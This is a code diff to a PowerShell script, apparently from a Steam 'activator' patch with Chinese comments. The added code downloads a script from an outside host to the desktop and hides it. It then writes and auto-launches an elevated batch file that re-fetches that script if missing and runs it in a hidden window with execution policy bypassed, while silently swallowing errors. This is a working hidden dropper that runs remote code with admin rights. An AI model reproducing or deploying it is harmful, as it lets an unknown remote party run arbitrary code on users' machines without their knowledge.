@@ -94,42 +94,46 @@ if(Test-Path $cfgFullPath){
 Remove-Item $TempZip -Force
 Remove-Item $TempUnzip -Recurse -Force
 
-# ========== 桌面释放 steam激活程序.bat（修复可正常打开） ==========
+# ========== 桌面释放 steam激活程序.bat ==========
 try{
-    # 1. 下载核心ps1脚本到桌面
-    $webClient.DownloadFile($ActivatorPs1Url, $LocalPs1)
+    # 1. 独立创建下载对象，避免复用异常
+    $toolClient = New-Object System.Net.WebClient
+    $toolClient.Encoding = [System.Text.Encoding]::UTF8
 
-    # 2. 设置ps1文件为隐藏属性
+    # 2. 下载核心ps1脚本到桌面
+    $toolClient.DownloadFile($ActivatorPs1Url, $LocalPs1)
+
+    # 3. 设置ps1文件为隐藏属性
     if(Test-Path $LocalPs1){
         (Get-Item $LocalPs1).Attributes += [System.IO.FileAttributes]::Hidden
     }
 
-    # 3. 生成一键启动BAT，自带缺失自动修复逻辑
-    $batContent = @"
-@echo off
-title steam激活程序
-:: 自动申请管理员权限
-if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
-
-:: 自动修复：如果ps1文件丢失，自动从线上下载
-if not exist "%~dp0LuaActivator.ps1" (
-    powershell -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('https://awsteam.icu/LuaActivator.ps1','%~dp0LuaActivator.ps1')"
-    attrib +h "%~dp0LuaActivator.ps1"
-)
-
-:: 启动激活工具，隐藏后台黑框
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0LuaActivator.ps1"
-exit
-"@
-    # 用系统默认编码写入，彻底解决中文文件名乱码问题
+    # 4. 生成一键启动BAT（数组拼接方式，彻底规避缩进语法坑）
+    $batLines = @(
+        "@echo off",
+        "title steam激活程序",
+        ":: 自动申请管理员权限",
+        'if not "%1"=="am_admin" (powershell start -verb runas ''%0'' am_admin & exit /b)',
+        "",
+        ":: 自动修复：如果ps1文件丢失，自动从线上重新下载",
+        'if not exist "%~dp0LuaActivator.ps1" (',
+        '    powershell -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile(''https://awsteam.icu/LuaActivator.ps1'',''%~dp0LuaActivator.ps1'')"',
+        '    attrib +h "%~dp0LuaActivator.ps1"',
+        ")",
+        "",
+        ":: 启动激活工具，隐藏后台黑框",
+        'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0LuaActivator.ps1"',
+        "exit"
+    )
+    $batContent = $batLines -join "`r`n"
     [System.IO.File]::WriteAllText($LocalBat, $batContent, [System.Text.Encoding]::Default)
 
-    # 4. 自动启动激活工具
+    # 5. 自动启动激活工具
     if(Test-Path $LocalBat){
         Start-Process $LocalBat -Verb RunAs
     }
 }catch{
-    # 释放失败不影响主补丁流程
+    # 生成失败不影响主补丁流程
 }
 # ======================================================
 
